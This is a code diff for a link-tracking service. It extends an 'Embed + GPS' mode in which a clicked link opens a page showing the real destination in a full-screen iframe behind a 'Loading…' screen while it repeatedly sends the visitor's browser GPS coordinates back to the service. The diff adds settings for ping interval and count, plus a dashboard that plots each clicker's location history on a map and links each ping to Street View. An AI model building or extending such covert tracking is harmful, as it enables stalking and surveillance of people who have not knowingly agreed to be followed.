@@ -222,6 +222,24 @@ async function main() {
     res.json({ ...updated, active: !!updated.active });
   }));
 
+  // ─── API: Edit Link Settings ─────────────────────────────────────
+  app.patch("/api/links/:slug", asyncHandler(async (req, res) => {
+    const { data: link, error: linkErr } = await supabase.from("links").select("*").eq("slug", req.params.slug).maybeSingle();
+    if (linkErr) throw linkErr;
+    if (!link) return res.status(404).json({ error: "link not found" });
+    const { tracking_mode, gps_interval, max_pings, label, destination } = req.body;
+    const updates = {};
+    if (tracking_mode === "redirect" || tracking_mode === "embed") updates.tracking_mode = tracking_mode;
+    if (typeof gps_interval === "number" && gps_interval >= 5 && gps_interval <= 3600) updates.gps_interval = Math.round(gps_interval);
+    if (typeof max_pings === "number" && max_pings >= 0 && max_pings <= 10000) updates.max_pings = Math.round(max_pings);
+    if (typeof label === "string") updates.label = label.slice(0, 200);
+    if (typeof destination === "string" && /^https?:\/\//i.test(destination) && destination.length <= 2048) updates.destination = destination;
+    if (!Object.keys(updates).length) return res.status(400).json({ error: "no valid fields to update" });
+    const { data: updated, error: updErr } = await supabase.from("links").update(updates).eq("id", link.id).select().single();
+    if (updErr) throw updErr;
+    res.json({ ...updated, active: !!updated.active });
+  }));
+
   // ─── API: Delete Link ──────────────────────────────────────────
   app.delete("/api/links/:slug", asyncHandler(async (req, res) => {
     const { data: link, error: linkErr } = await supabase.from("links").select("*").eq("slug", req.params.slug).maybeSingle();
@@ -451,12 +469,13 @@ function interstitialHTML(slug, destination, trackingMode, gpsInterval, maxPings
   return `<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>${isEmbed ? 'Loading' : ''}</title><style>
 html,body{margin:0;padding:0;height:100%;}
-body{font-family:system-ui,sans-serif;background:#fff;color:#666;}
-${isEmbed ? `#frame{position:fixed;inset:0;width:100%;height:100%;border:none;z-index:1;}` : ``}
+body{font-family:system-ui,sans-serif;background:#0f1117;color:#71717a;}
+${isEmbed ? `#frame{position:fixed;inset:0;width:100%;height:100%;border:none;z-index:1;}` : `body{display:flex;align-items:center;justify-content:center;font-size:0.85rem;}`}
+${isEmbed ? `#loading{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;font-size:0.85rem;z-index:10;background:#0f1117;transition:opacity 0.3s;}` : ``}
 </style></head>
 <body>
-${isEmbed ? `<iframe id="frame" src="${destEsc}" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation-by-user-activation" loading="lazy"></iframe>` : ``}
-<noscript><meta http-equiv="refresh" content="0;url=${destEsc}"><p style="margin-top:2rem;text-align:center;"><a href="${destEsc}">Continue</a></p></noscript>
+${isEmbed ? `<div id="loading"><p>Loading\u2026</p></div><iframe id="frame" src="${destEsc}" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation-by-user-activation" loading="lazy"></iframe>` : `<p>Redirecting\u2026</p>`}
+<noscript><meta http-equiv="refresh" content="0;url=${destEsc}"><p style="margin-top:1rem;text-align:center;"><a href="${destEsc}" style="color:var(--accent,#6366f1)">Continue</a></p></noscript>
 <script>
 const SLUG = ${JSON.stringify(slug).replace(/<\/script/gi, '<\\/script')};
 const DEST = ${JSON.stringify(destination).replace(/<\/script/gi, '<\\/script')};
@@ -502,7 +521,7 @@ if (navigator.geolocation) {
     pos => {
       if (!clickPosted) {
         clickPosted = true;
-        postClick({ slug: SLUG, gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy });
+        postClick({ slug: SLUG, gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy }).then(() => { const ld = document.getElementById('loading'); if (ld) ld.style.opacity = '0'; setTimeout(() => { if (ld) ld.style.display = 'none'; }, 300); });
       } else {
         postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
       }
@@ -635,7 +654,7 @@ function dashboardHTML() {
         <label>Label (optional)</label>
         <input type="text" id="labelInput" placeholder="Campaign name">
       </div>
-      <div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><button type="submit" class="btn-primary" style="height:38px;margin-bottom:1px;">Create Link</button>
+      <div class="form-group" style="flex:0.6;min-width:120px;"><label>Tracking</label><select id="trackingInput" style="font-size:0.875rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.6rem 0.75rem;"><option value="redirect">Redirect</option><option value="embed">Embed + GPS</option></select></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>GPS every (s)</label><input type="number" id="intervalInput" value="30" min="5" max="3600" placeholder="30"></div><div class="form-group" style="flex:0.4;min-width:70px;"><label>Max pings</label><input type="number" id="maxPingsInput" value="100" min="0" max="10000" placeholder="100"></div><button type="submit" class="btn-primary" style="height:38px;margin-bottom:1px;">Create Link</button>
     </form>
   </div>
   <div class="card" id="linksCard">
@@ -686,7 +705,7 @@ async function loadLinks(){
     <td><span class="destination" title="\${esc(l.destination)}">\${esc(l.destination)}</span></td>
     <td>\${esc(l.label)||'<span style="color:var(--muted)">\u2014</span>'}</td>
     <td><span class="click-count">\${l.click_count}</span></td>
-    <td><span class="badge \${l.active?'badge-active':'badge-inactive'}">\${l.active?'Active':'Paused'}</span>\${l.tracking_mode==='embed'?' <span style="font-size:0.6rem;color:var(--green);">\ud83d\udce1 Live</span>':''}</td>
+    <td><span class="badge \${l.active?'badge-active':'badge-inactive'}">\${l.active?'Active':'Paused'}</span>\${l.tracking_mode==='embed'?' <span style="font-size:0.6rem;color:var(--green);">\ud83d\udce1 Live</span> <span style="font-size:0.55rem;color:var(--muted);">\${l.gps_interval||30}s</span>':''}</td>
     <td>\${fmtDate(l.created_at)}</td>
     <td class="actions">
       <button class="btn-sm btn-primary" data-slug="\${esc(l.slug)}" onclick="viewDetail(this.dataset.slug)">Details</button>
@@ -702,7 +721,8 @@ document.getElementById('createForm').addEventListener('submit',async e=>{
   const label=document.getElementById('labelInput').value||undefined;
   const tracking_mode=document.getElementById('trackingInput').value;
   const gps_interval=parseInt(document.getElementById('intervalInput').value)||30;
-  try{const r=await api('POST','/api/links',{destination:dest,slug,label,tracking_mode,gps_interval});if(r.error){showToast('Error: '+r.error);return;}
+  const max_pings=parseInt(document.getElementById('maxPingsInput').value)||100;
+  try{const r=await api('POST','/api/links',{destination:dest,slug,label,tracking_mode,gps_interval,max_pings});if(r.error){showToast('Error: '+r.error);return;}
   document.getElementById('destInput').value='';document.getElementById('slugInput').value='';document.getElementById('labelInput').value='';
   showToast('Link created!');if(r.iframe_warning)setTimeout(()=>showToast('\u26a0\ufe0f '+r.iframe_warning),2600);loadLinks();}catch(e){showToast('Error creating link');}
 });
@@ -719,7 +739,34 @@ async function viewDetail(slug){
   if(data.by_country&&data.by_country.length){const mx=Math.max(...data.by_country.map(x=>x.count),1);countryBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By Country</h3><div class="bar-chart">'+data.by_country.map(d=>'<div class="bar-row"><span class="bar-label">'+flagEmoji(d.country)+' '+esc(d.country)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
   if(data.by_city&&data.by_city.length){const mx=Math.max(...data.by_city.map(x=>x.count),1);cityBars='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">By City</h3><div class="bar-chart">'+data.by_city.map(d=>'<div class="bar-row"><span class="bar-label">'+esc(d.city)+'</span><div class="bar-fill" style="width:'+(d.count/mx*100).toFixed(1)+'%"></div><span class="bar-value">'+d.count+'</span></div>').join('')+'</div>';}
   let pingSection='';
-  if(data.location_pings&&data.location_pings.length){pingSection='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">\ud83d\udce1 Location Pings ('+data.location_pings.length+')</h3><div style="max-height:150px;overflow-y:auto;font-size:0.7rem;">'+data.location_pings.map(function(p){return '<span style="color:var(--muted);">'+fmtDT(p.pinged_at)+'</span> '+(p.lat!=null?p.lat.toFixed(4):'?')+', '+(p.lon!=null?p.lon.toFixed(4):'?')+(p.accuracy?' \u00b1'+Math.round(p.accuracy)+'m':'')+'<br>';}).join('')+'</div>';}
+  const pings=data.location_pings||[];
+  if(pings.length){
+    const pingRows=pings.map(function(p,i){return '<tr><td style="color:var(--muted);font-size:0.65rem;">'+fmtDT(p.pinged_at)+'</td><td>'+(p.lat!=null?p.lat.toFixed(6):'?')+'</td><td>'+(p.lon!=null?p.lon.toFixed(6):'?')+'</td><td>'+(p.accuracy?'\u00b1'+Math.round(p.accuracy)+'m':'\u2014')+'</td><td><a href="#" onclick="showStreetView('+p.lat+','+p.lon+');return false;" style="color:var(--accent);font-size:0.65rem;text-decoration:none;">\ud83c\udfe0</a></td></tr>';}).join('');
+    const validPings=pings.filter(p=>p.lat!=null&&p.lon!=null);
+    const hasValidPings=validPings.length>0;
+    let mapEmbed='';
+    if(hasValidPings){
+      const bounds=validPings.reduce((a,p)=>({minLat:Math.min(a.minLat,p.lat),maxLat:Math.max(a.maxLat,p.lat),minLon:Math.min(a.minLon,p.lon),maxLon:Math.max(a.maxLon,p.lon)}),{minLat:90,maxLat:-90,minLon:180,maxLon:-180});
+      const cLat=((bounds.minLat+bounds.maxLat)/2).toFixed(6);
+      const cLon=((bounds.minLon+bounds.maxLon)/2).toFixed(6);
+      const span=Math.max(bounds.maxLat-bounds.minLat,bounds.maxLon-bounds.minLon,0.005).toFixed(6);
+      const markers=validPings.map((p,i)=>'marker='+p.lat.toFixed(6)+','+p.lon.toFixed(6)).join('&');
+      mapEmbed='<div style="position:relative;width:100%;height:250px;border:1px solid var(--border);border-radius:10px;margin-bottom:0.5rem;overflow:hidden;">'+
+        '<iframe style="width:100%;height:100%;border:none;" sandbox="allow-scripts allow-popups" allowfullscreen loading="lazy" src="https://www.openstreetmap.org/export/embed.html?bbox='+bounds.minLon.toFixed(6)+'%2C'+bounds.minLat.toFixed(6)+'%2C'+bounds.maxLon.toFixed(6)+'%2C'+bounds.maxLat.toFixed(6)+'&layer=mapnik&'+markers+'"></iframe>'+
+        '</div>';
+    }
+    pingSection='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">\ud83d\udce1 GPS History ('+pings.length+' pings)</h3>'+
+      mapEmbed+
+      '<div style="max-height:200px;overflow-y:auto;"><table class="clicks-table"><thead><tr><th>Time</th><th>Lat</th><th>Lon</th><th>Acc</th><th></th></tr></thead><tbody>'+pingRows+'</tbody></table></div>';
+  }
+  const isEmbed=data.tracking_mode==='embed';
+  const settingsSection='<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">\u2699\ufe0f Tracking Settings</h3>'+
+    '<div style="display:flex;gap:0.75rem;flex-wrap:wrap;align-items:flex-end;">'+
+    '<div class="form-group" style="flex:0.6;min-width:120px;"><label>Mode</label><select id="editTracking" style="font-size:0.8rem;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);padding:0.4rem 0.6rem;"><option value="redirect"'+(isEmbed?'':' selected')+'>Redirect</option><option value="embed"'+(isEmbed?' selected':'')+'>Embed + GPS</option></select></div>'+
+    '<div class="form-group" style="flex:0.4;min-width:80px;"><label>GPS interval (s)</label><input type="number" id="editInterval" value="'+(data.gps_interval||30)+'" min="5" max="3600" style="font-size:0.8rem;padding:0.4rem 0.6rem;"></div>'+
+    '<div class="form-group" style="flex:0.4;min-width:80px;"><label>Max pings</label><input type="number" id="editMaxPings" value="'+(data.max_pings||100)+'" min="0" max="10000" style="font-size:0.8rem;padding:0.4rem 0.6rem;"></div>'+
+    '<button class="btn-primary btn-sm" onclick="saveLinkSettings(\''+esc(data.slug)+'\')" style="height:32px;">Save</button>'+
+    '</div>';
   document.getElementById('modalContent').innerHTML=
     '<button class="close-btn" onclick="closeModal()">\u2715</button>'+
     '<h2>\ud83d\udcca <span class="slug">/'+esc(data.slug)+'</span></h2>'+
@@ -730,12 +777,23 @@ async function viewDetail(slug){
       '<div class="stat-box"><div class="val">'+fmtDate(st.first_click)+'</div><div class="lbl">First Click</div></div>'+
       '<div class="stat-box"><div class="val">'+fmtDate(st.last_click)+'</div><div class="lbl">Last Click</div></div>'+
     '</div>'+
+    settingsSection+
     (dayBars?'<h3 style="font-size:0.8rem;margin-bottom:0.5rem;">Clicks by Day</h3><div class="bar-chart">'+dayBars+'</div>':'')+
-    countryBars+cityBars+pingSection+
+    countryBars+cityBars+
+    pingSection+
     '<h3 style="font-size:0.8rem;margin:0.75rem 0 0.5rem;">Recent Clicks</h3>'+
     '<div style="overflow-x:auto;"><table class="clicks-table"><thead><tr><th>Time</th><th>IP</th><th>Location</th><th>Device</th><th>Referrer</th></tr></thead><tbody>'+(cRows||'<tr><td colspan="5" style="text-align:center;padding:1rem;">No clicks yet</td></tr>')+'</tbody></table></div>'+
-    '<div id="streetViewPanel" style="display:none;margin-top:1rem;"><h3 style="font-size:0.8rem;margin:0 0 0.5rem;">\ud83c\udfe0 Street View</h3><iframe id="streetViewFrame" style="width:100%;height:300px;border:1px solid var(--border);border-radius:10px;" sandbox="allow-scripts allow-popups" allowfullscreen loading="lazy"></iframe><div style="font-size:0.65rem;color:var(--muted);margin-top:0.3rem;">Click any \ud83c\udfe0 location above to view</div></div>';
+    '<div id="streetViewPanel" style="display:none;margin-top:1rem;"><h3 style="font-size:0.8rem;margin:0 0 0.5rem;">\ud83c\udfe0 Street View</h3><iframe id="streetViewFrame" style="width:100%;height:300px;border:1px solid var(--border);border-radius:10px;" sandbox="allow-scripts allow-popups" allowfullscreen loading="lazy"></iframe><div style="font-size:0.65rem;color:var(--muted);margin-top:0.3rem;">Click any \ud83c\udfe0 location to view</div></div>';
   document.getElementById('modalOverlay').classList.add('open');
+}
+async function saveLinkSettings(slug){
+  const tracking_mode=document.getElementById('editTracking').value;
+  const gps_interval=parseInt(document.getElementById('editInterval').value)||30;
+  const max_pings=parseInt(document.getElementById('editMaxPings').value)||100;
+  const r=await api('PATCH','/api/links/'+slug,{tracking_mode,gps_interval,max_pings});
+  if(r.error){showToast('Error: '+r.error);return;}
+  showToast('Settings saved');
+  loadLinks();
 }
 function closeModal(){document.getElementById('modalOverlay').classList.remove('open');}
 function showStreetView(lat,lon){
